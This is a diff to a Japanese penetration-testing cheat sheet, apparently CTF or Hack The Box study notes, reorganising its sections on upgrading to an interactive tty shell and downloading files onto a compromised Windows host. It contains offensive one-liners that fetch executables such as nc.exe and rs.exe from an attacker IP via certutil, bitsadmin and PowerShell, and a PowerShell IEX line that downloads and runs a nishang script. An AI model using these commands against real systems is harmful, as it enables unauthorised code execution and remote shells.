@@ -1075,16 +1075,15 @@ aircrack-ng <filename>.cap
 
 ### tty shell
 ```
-python -c 'import pty;pty.spawn("/bin/sh")'
+#bashが制限されている場合はsh
 python -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/sh")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-ruby: exec "/bin/sh"
-lua: os.execute('/bin/sh')
+perl -e 'exec "/bin/bash";'
+perl: exec "/bin/bash";
+ruby: exec "/bin/bash"
+lua: os.execute('/bin/bash')
 ```
 
 ・Ctrl+c，Ctrl+zなどを利用可能にする
@@ -1274,35 +1273,19 @@ gcc cowroot.c -o cowroot -pthread
 []
 
 ### ファイルのダウンロード
-#### curl
 ```
 curl http://10.10.10.1:9000/putty.exe -o putty.exe
-```
-
-#### certutil.exe
-```
-certutil.exe -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
-```
-
-#### powershell.exe
-##### ダウンロード
-```
-powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
-
+certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
+bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
+powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
 powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
-
 powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
-
-powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
+powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
 ```
-##### ダウンロード&実行
+
+#### ダウンロード&実行
 ```
 powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
-```
-
-#### Bitsadmin
-```
-bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
 ```
 
 #### SMBを用いたファイル共有
